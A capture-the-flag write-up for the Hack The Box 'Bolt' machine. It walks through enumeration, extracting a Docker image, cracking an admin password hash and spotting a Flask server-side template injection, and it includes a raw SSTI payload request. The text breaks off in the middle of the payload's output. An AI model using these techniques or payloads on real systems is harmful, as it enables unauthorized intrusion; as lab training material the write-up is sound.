# [bolt](https://app.hackthebox.com/machines/384)

> A Linux machine hosting several web applications of Bolt, "an experienced and passionate group of designers, developers, project managers, writers, and artists who work on various digital marketing solutions." One of the web applications is Bolt's customized [AdminLTE Flask](https://appseed.us/admin-dashboards/flask-dashboard-adminlte) Docker container and its corresponding image is also available for download. Downloading and inspecting the image reveals the static invite code necessary to register an account with Bolt's demo AdminLTE installation and their mail server. Source code analysis of one of Bolt's AdminLTE's custom endpoints reveals a server-side template injection vulnerability which, when combined with access to the mail server, grants a low-privilege shell. The low-privilege shell is capable of enumerating several MySQL passwords, one of which is reused as the password of one of the system's users. That same password grants access to the MySQL database of Bolt's [Passbolt](https://www.passbolt.com/) installation, which contains `root`'s password encrypted with the user's PGP private key. The user's PGP private key is disclosed in a Passbolt Chrome extension log and its passphrase is in `rockyou.txt` and thus, easily crackable. After decrypting `root`'s password, elevated access is achieved.

---

# Open Port Enumeration

The target's TCP ports 22 (SSH), 80 (HTTP), and 443 (HTTPS) are open.

```bash
$ sudo masscan -p1-65535 10.129.161.182 --rate=1000 -e tun0 --output-format grepable --output-filename enum/bolt.masscan
$ cat enum/bolt.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,443,80,
```

According to [launchpad.net](https://launchpad.net/ubuntu/+source/openssh/1:8.2p1-4ubuntu0.3), the OpenSSH banner indicates the target's operating system is Ubuntu 20.04 (Focal).

On port 80, [nginx](https://www.nginx.com/) 1.18.0 is serving a website whose title is "Starter Website - About."

On port 443, [nginx](https://www.nginx.com/) 1.18.0 is serving a web application whose title is "Passbolt  | Open source password manager for teams." This must be an instance of [Passbolt](https://www.passbolt.com/), whose various Github repositories can be found [here](https://github.com/passbolt). The application's SSL certificate is for `passbolt.bolt.htb`. Add both `passbolt.bolt.htb` and `bolt.htb` to the local DNS resolver.

```bash
$ sudo nmap -sC -sV -O -p22,80,443 10.129.161.182 -oA enum/bolt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-19 12:35 EST
Nmap scan report for 10.129.161.182
Host is up (0.042s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)
|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)
|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2021-02-24T19:11:23
|_Not valid after:  2022-02-24T19:11:23
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.29 seconds
```

---

## Port 80 Enumeration

### Manual Enumeration

The website is for Bolt, "an experienced and passionate group of designers, developers, project managers, writers, and artists" who work on various digital marketing solutions."

Near the bottom of the index page, it also mentions that Bolt "is a large User Interface Kit that will help you prototype and design beautiful, creative and modern websites." This must be one of their projects and they named it after the organization.

#### Index Page

The index page starts of with a large banner advertising **AdminLTE**, "a custom administration web application available for download."

The index page specifies three Bolt employees: Josepth Garth (co-founder), Bonnie Green (web developer), and Jose Leos (web publications designer).

There is a contact form that `POST`s to `/`. The response is a 405 Method Not Allowed, indicating this is a dead form.

#### Contact Form

There is a contact form at `/contact` that specifies Bolt's main phone number, office hours, and two email addresses: `support@bolt.htb` and `sales@bolt.htb`.

It specifies three members of its support team: Christopher M. Wood (sales), Bonnie M. Green (marketing), and Neil D. Sims (invoice).

It also contains a contact form that results in a `GET` request to `/contact` with no parameters. This is likely a dead form as well.

#### Services Page

`/services` describes various vague "services" Bolt offers. There is an email subscription form that sends a `GET` request to `/services` with no parameters. This is likely a dead form.

#### Pricing Page

`/pricing` describes Bolt's subscription pricing model and contains a few FAQs.

One of the FAQs is interesting: "What is included in the free docker image provided?" -> "We have packed up a minimal frontpage and admin website to help build a foundation for your web application project. We provide fully comprehensive templates in our paid packages as well as hosting if you like our free package." This Docker image must be the **AdminLTE** application described on the index page.

#### Registration Form

There is an account registration form at `/register`. It takes a username, an email, and a password. However, attempting to submit the form results in a 500 Internal Server Error.

#### Login Form

There is a login form at `/login`. It takes a username and a password.

Attempting SQL injection on the login form is unsuccessful.

An invalid login results in a 403 Forbidden response of size 7464.

#### Email Verification Page

Navigating to `/check-email` unauthenticated results in the following page.

![](images/Pasted%20image%2020220219151339.png)

#### Download Page

The download page contains a link to Bolt's **AdminLTE** Docker image, which is "a basic web package ready for you to kickstart your project with a slick and elogant design."

The download path is `/uploads/image.tar`.

### Content Discovery

Automated content discovery doesn'tuncover any paths that weren't found manually.

```bash
$ feroxbuster -u http://bolt.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://bolt.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
308      GET        4l       24w      251c http://bolt.htb/index => http://bolt.htb/
200      GET      173l      564w     9287c http://bolt.htb/login
200      GET      199l      639w    11038c http://bolt.htb/register
200      GET      468l     1458w    26293c http://bolt.htb/contact
500      GET        4l       40w      290c http://bolt.htb/profile
302      GET        4l       24w      209c http://bolt.htb/logout => http://bolt.htb/
200      GET      346l     1141w    18570c http://bolt.htb/download
200      GET      405l     1419w    22443c http://bolt.htb/services
200      GET      505l     1801w    30347c http://bolt.htb/
200      GET      549l     2014w    31731c http://bolt.htb/pricing
200      GET      173l      564w     9287c http://bolt.htb/sign-in
200      GET      199l      639w    11038c http://bolt.htb/sign-up
200      GET      147l      480w     7331c http://bolt.htb/check-email
[####################] - 1m     86006/86006   0s      found:13      errors:0
[####################] - 1m     43003/43003   509/s   http://bolt.htb
[####################] - 1m     43003/43003   509/s   http://bolt.htb/
```

### Virtual Host Discovery

There are two more virtual hosts on port 80: `mail.bolt.htb` and `demo.bolt.htb`. Add these hostnames to the local DNS resolver.

```bash
$ gobuster vhost -u http://bolt.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://bolt.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/02/19 13:08:30 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mail.bolt.htb (Status: 200) [Size: 4943]
Found: demo.bolt.htb (Status: 302) [Size: 219]

===============================================================
2022/02/19 13:08:57 Finished
===============================================================
```

---

## `http://mail.mailbox.htb`

### Manual Enumeration

The index page is the login form of a typical [Roundcube](https://roundcube.net/) installation. This indicates some form of emailing could be involved. Without a credential, can't move forward.

![](images/Pasted%20image%2020220220014417.png)

### Content Discovery

Automated content discovery doesn't uncover anything significant.

```bash
$ feroxbuster -u http://mail.bolt.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://mail.bolt.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💢  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
WLD      GET       99l      322w        0c Got 200 for http://mail.bolt.htb/2b70f828241c4d61947a829c1527b02c (url length: 32)
301      GET        7l       12w      178c http://mail.bolt.htb/bin => http://mail.bolt.htb/bin/
301      GET        7l       12w      178c http://mail.bolt.htb/plugins => http://mail.bolt.htb/plugins/
301      GET        7l       12w      178c http://mail.bolt.htb/logs => http://mail.bolt.htb/logs/
301      GET        7l       12w      178c http://mail.bolt.htb/temp => http://mail.bolt.htb/temp/
301      GET        7l       12w      178c http://mail.bolt.htb/config => http://mail.bolt.htb/config/
301      GET        7l       12w      178c http://mail.bolt.htb/skins => http://mail.bolt.htb/skins/
301      GET        7l       12w      178c http://mail.bolt.htb/public_html => http://mail.bolt.htb/public_html/
301      GET        7l       12w      178c http://mail.bolt.htb/installer => http://mail.bolt.htb/installer/
301      GET        7l       12w      178c http://mail.bolt.htb/program => http://mail.bolt.htb/program/
301      GET        7l       12w      178c http://mail.bolt.htb/vendor => http://mail.bolt.htb/vendor/
301      GET        7l       12w      178c http://mail.bolt.htb/SQL => http://mail.bolt.htb/SQL/
[####################] - 4m     43003/43003   0s      found:12      errors:0
[####################] - 4m     43004/43003   157/s   http://mail.bolt.htb
```

---

## `http://demo.bolt.htb`

### Manual Enumeration

#### Index Page

The index page redirects to the login form at `/login`.

#### Login Form

The login form looks similar to the one at `http://email.bolt.htb`. It doesn't appear vulnerable to SQL injection and responds with a 403 Forbidden response given an invalid login.

#### Registration Form

The registration form at `/register` requires a username, `@bolt.htb` email address, password, and **invite code**.

### Content Discovery

Nothing significant here.

```bash
$ feroxbuster -u http://demo.bolt.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://demo.bolt.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      179l      579w     9710c http://demo.bolt.htb/login
200      GET      199l      640w    11066c http://demo.bolt.htb/register
302      GET        4l       24w      219c http://demo.bolt.htb/logout => http://demo.bolt.htb/login
302      GET        4l       24w      219c http://demo.bolt.htb/ => http://demo.bolt.htb/login
[####################] - 45s    43003/43003   0s      found:4       errors:0
[####################] - 45s    43003/43003   949/s   http://demo.bolt.htb
```

---

## Port 443 Enumeration

### Virtual Host Discovery

There are no extra virtual hosts on port 443.

```bash
$ gobuster vhost -u https://bolt.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          https://bolt.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/02/19 15:18:20 Starting gobuster in VHOST enumeration mode
===============================================================

===============================================================
2022/02/19 15:21:01 Finished
===============================================================
```

---

## `https://passbolt.bolt.htb`

### Manual Enumeration

The index page is a [Passbolt](https://github.com/passbolt) installation, prompting for a valid email to be able to proceed.

![](images/Pasted%20image%2020220220014757.png)

### Content Discovery

All dynamic paths appear to redirect to `/auth/login`.

```bash
$ gobuster dir -u https://passbolt.bolt.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://passbolt.bolt.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/19 15:36:28 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 301) [Size: 0] [--> https://passbolt.bolt.htb/auth/login]
/js                   (Status: 301) [Size: 178] [--> https://passbolt.bolt.htb/js/]
/css                  (Status: 301) [Size: 178] [--> https://passbolt.bolt.htb/css/]
/register             (Status: 301) [Size: 0] [--> https://passbolt.bolt.htb/users/register]
/logout               (Status: 301) [Size: 0] [--> https://passbolt.bolt.htb/auth/logout]
/img                  (Status: 301) [Size: 178] [--> https://passbolt.bolt.htb/img/]
/users                (Status: 302) [Size: 0] [--> /auth/login?redirect=%2Fusers]
/app                  (Status: 302) [Size: 0] [--> /auth/login?redirect=%2Fapp]
/resources            (Status: 302) [Size: 0] [--> /auth/login?redirect=%2Fresources]
/fonts                (Status: 301) [Size: 178] [--> https://passbolt.bolt.htb/fonts/]
/groups               (Status: 302) [Size: 0] [--> /auth/login?redirect=%2Fgroups]
/recover              (Status: 301) [Size: 0] [--> https://passbolt.bolt.htb/users/recover]
/.json                (Status: 401) [Size: 233]
/locales              (Status: 301) [Size: 178] [--> https://passbolt.bolt.htb/locales/]
/healthcheck          (Status: 403) [Size: 3738]
/roles                (Status: 302) [Size: 0] [--> /auth/login?redirect=%2Froles]

===============================================================
2022/02/19 15:51:07 Finished
===============================================================
```

---

## AdminLTE Docker Image Analysis

The Docker image from `http://bolt.htb` is a tar archive. Untar the image:

```bash
$ tar -xvf image.tar
187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/
187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/VERSION
187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/json
187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar
1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/
1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/VERSION
1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/json
1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tar
2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/
2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/VERSION
2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/json
2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar
3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/
3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/VERSION
3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/json
3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar
3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/
3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/VERSION
3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/json
3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar
3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/
3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/VERSION
3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/json
3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tar
41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/
41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/VERSION
41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/json
41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar
745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/
745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/VERSION
745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/json
745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar
859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json
9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/
9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/VERSION
9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/json
9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar
a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/
a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/VERSION
a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/json
a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar
d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/
d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/VERSION
d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/json
d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/layer.tar
manifest.json
repositories
```

All Docker images consist of several layers. Each layer stores changes from the previous layer.

Each 64-character hash directory represents one of the image's layers. Since this archive contains all of its layers, it was likely produced by [docker save](https://docs.docker.com/engine/reference/commandline/save/), which saves one or more images to a tar archive, retaining its layers. [docker load](https://docs.docker.com/engine/reference/commandline/load/) can be used to spin up a container of the image.

According to the image's manifest (`manifest.json`), the application is built on top of [AppSeed's flask-adminlte](https://github.com/app-generator/flask-adminlte) image.

```json
[
  {
    "Config": "859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json",
    "RepoTags": [
      "flask-dashboard-adminlte_appseed-app:latest"
    ],
    "Layers": [
      "187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar",
      "745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar",
      "41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar",
      "d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/layer.tar",
      "3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tar",
      "9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar",
      "1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tar",
      "a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar",
      "3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar",
      "2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar",
      "3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar"
    ]
  }
]
```

### Layer `a4ea`

```bash
$ tree -a
.
├── json
├── layer
│   ├── db.sqlite3
│   ├── root
│   │   └── .ash_history
│   └── tmp
└── VERSION

3 directories, 4 files
```

Neither the `root/` nor the `/tmp` directories contain anything interesting, but the SQLite database is interesting.

There is only a single table, `User`.

```bash
sqlite> .tables
User
```

`User` contains several columns typical of user database tables: `id`, `username`, `email`, `password`, and more.

```sql
sqlite> SELECT sql FROM sqlite_master WHERE type = 'table' AND name = 'User';
CREATE TABLE "User" (
        id INTEGER NOT NULL,
        username VARCHAR,
        email VARCHAR,
        password BLOB,
        email_confirmed BOOLEAN,
        profile_update VARCHAR(80),
        PRIMARY KEY (id),
        UNIQUE (username),
        UNIQUE (email)
)
```

The table contains on entry for user `admin` with email address `admin@bolt.htb` with the md5crypt hash `$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.`.

```sql
sqlite> select * from User;
1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||
```

`admin`'s password is `deadbolt`.

```bash
$ hashcat -m 500 '$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.' rockyou.txt
$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt
```

---

## `http://bolt.htb` AdminLTE Dashboard

Use the credential `admin@bolt.htb`:`deadbolt` to access the dashboard at `http://bolt.htb`.

### Direct Chat Between Alexander Pierce & Sarah Bullock

According to Alexander Pierce, the security team had a concern with the Docker image related to **email**. Alexander asks if Sarah has taken a look at the image.

Sarah wasn't able to look at it because their demo (`demo.bolt.htb`) is currently invite-only. She needs Eddie's help.

Alexander assures Sarah that she'll get Eddie to look it over.

Sarah urges Alexander to make sure the image is scrubbed before hosting it.

![](images/Pasted%20image%2020220220015109.png)

---

## Registration Code in AdminLTE Docker Image

Based on Alexander and Sarah's conversation, search through the Docker image for the registration logic that references the invite code. This leads to `41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer/app/base/routes.py`'s `/register` endpoint. It checks for a static invite code, `XNSS-HSJW-3NGU-8XTJ`.

```python
@blueprint.route('/register', methods=['GET', 'POST'])
def register():
    login_form = LoginForm(request.form)
    create_account_form = CreateAccountForm(request.form)
    if 'register' in request.form:

        username  = request.form['username']
        email     = request.form['email'   ]
        code      = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
            return render_template('code-500.html')
        data = User.query.filter_by(email=email).first()
        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
            # Check usename exists
            user = User.query.filter_by(username=username).first()
            if user:
                return render_template( 'accounts/register.html',
                                    msg='Username already registered',
                                    success=False,
                                    form=create_account_form)

            # Check email exists
            user = User.query.filter_by(email=email).first()
            if user:
                return render_template( 'accounts/register.html',
                                    msg='Email already registered',
                                    success=False,
                                    form=create_account_form)

            # else we can create the user
            user = User(**request.form)
            db.session.add(user)
            db.session.commit()

            return render_template( 'accounts/register.html',
                                msg='User created please <a href="/login">login</a>',
                                success=True,
                                form=create_account_form)

    else:
        return render_template( 'accounts/register.html', form=create_account_form)
```

Use this code to register for an account on `http://demo.bolt.htb/register`. Once registered, the same credential can be used to login at `http://mail.bolt.htb` as well.

---

## Server-Side Template Injection in Demo Application

The interface of `http://demo.bolt.htb` is remarkably similar to the **AdminLTE** interface on `http://bolt.htb`, except there is an option that allows the user to update their profile.

The related source code can be found at `41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer/app/home/routes.py`. The `POST` to `/example-profile` endpoint, which is an "experimental feature," allows a user to update their profile.

More specifically, the user can input a name, experience paragraph, and skills list. The input name is temporarily saved in the user's `profile_update` field in the database. An email is sent to the user's email address with a link to `/confirm/changes/$TOKEN` that contains a unique, reversible token created from the user's username and the salt `changes-confirm-key`.

```python
@blueprint.route("/example-profile", methods=['GET', 'POST'])
@login_required
def profile():
    """Profiles"""
    if request.method == 'GET':
        return render_template('example-profile.html', user=user,current_user=current_user)
    else:
        """Experimental Feature"""
        cur_user = current_user
        user = current_user.username
        name = request.form['name']
        experience = request.form['experience']
        skills = request.form['skills']
        msg = Message(
                recipients=[f'{cur_user.email}'],
                sender = 'support@example.com',
                reply_to = 'support@example.com',
                subject = "Please confirm your profile changes"
            )
        try:
            cur_user.profile_update = name
        except:
            return render_template('page-500.html')
        db.session.add(current_user)
        db.session.commit()
        token = ts.dumps(user, salt='changes-confirm-key')
        confirm_url = url_for('home_blueprint.confirm_changes',token=token,_external=True)
        html = render_template('emails/confirm-changes.html',confirm_url=confirm_url)
        msg.html = html
        mail.send(msg)
        return render_template('index.html')
```

When the user follows the link, the endpoint derives the username from the token, retrieves the input name from the `profile_update` field, builds an email whose body is the following HTML template,

```html
<html>
        <body>
                <p> %s </p>
                <p> This e-mail serves as confirmation of your profile username changes.</p>
        </body>
</html>
```

inserts the input name directly into the `%s` template variable, **renders the template**, then sends the email to the user.

```python
@blueprint.route('/confirm/changes/<token>')
def confirm_changes(token):
    """Confirmation Token"""
    try:
        email = ts.loads(token, salt="changes-confirm-key", max_age=86400)
    except:
        abort(404)
    user = User.query.filter_by(username=email).first_or_404()
    name = user.profile_update
    template = open('templates/emails/update-name.html', 'r').read()
    msg = Message(
            recipients=[f'{user.email}'],
            sender = 'support@example.com',
            reply_to = 'support@example.com',
            subject = "Your profile changes have been confirmed."
        )
    msg.html = render_template_string(template % name)
    mail.send(msg)

    return render_template('index.html')
```

This appears to be vulnerable to server-side template injection (SSTI) because of how the server inserts the unsanitized user input name directly into the HTML template *and then renders it* before sending it as the body of the email message. By updating their name to a valid Jinja template string such as `{{ 7*7 }}`, the attacker can coerce the server into executing the limited Python code within the Jinja template string and then sending the output in the body of the email. The resultant email from this injection proves the existence of the SSTI vulnerability:

![](images/Pasted%20image%2020220219231018.png)

It is possible to view the current context's accessible built in functions via the following request.

```http
POST /admin/profile HTTP/1.1
Host: demo.bolt.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 157
Origin: http://demo.bolt.htb
Connection: close
Referer: http://demo.bolt.htb/admin/profile
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGdpaGYifQ.YhGxhg.nGIdWDqOXKhElT2MPL0xQQbF0g0
Upgrade-Insecure-Requests: 1

name={{+get_flashed_messages.__globals__.__builtins__+}}&experience=experYENCE&skills=skillz
```

```txt
{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 